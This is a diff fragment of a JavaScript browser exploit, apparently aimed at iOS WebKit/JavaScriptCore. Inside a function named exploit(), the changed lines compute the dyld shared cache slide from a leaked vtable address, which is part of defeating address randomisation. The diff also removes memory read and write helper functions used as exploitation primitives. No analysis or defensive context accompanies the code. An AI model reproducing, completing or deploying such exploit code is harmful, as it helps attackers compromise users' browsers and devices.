@@ -515,8 +515,8 @@ function exploit(){
         let cnt = 0;
         var ccc = 0;
         var vtab = 0x1B205A808;
-        var slide = Sub(v_tlb, vtab); 
-        var slide = Sub(slide, new Int64('0x10'));
+        var nslide = Sub(v_tlb, vtab); 
+        var slide = Sub(nslide, new Int64('0x10'));
         log('[+] That means that the dyld shared cache slide should be '+slide.toString(16));
         //var base = Add(new Int64('0x1881BD000'), nslide);
         //log('[+] And thus the JavaScriptCore base is '+base.toString(16));
@@ -525,28 +525,6 @@ function exploit(){
         function _u32(i)
     {
         return b2u32(this.read(i,4));
-    }
-        
-        function _read(i, l)
-    {
-        if (i instanceof Int64) i = i.lo();
-        if (l instanceof Int64) l = l.lo();
-        if (i + l > this.length)
-        {
-            fail(`OOB read: ${i} -> ${i + l}, size: ${l}`);
-        }
-        return this.slice(i, i + l);
-    }
-
-    function _readInt64(addr)
-    {
-        return new Int64(this.read(addr, 8));
-    }
-
-    function _writeInt64(i, val)
-    {
-        if (i instanceof Int64) i = i.lo();
-        this.set(val.bytes(), i);
     }
 
     memory.u32 = _u32;
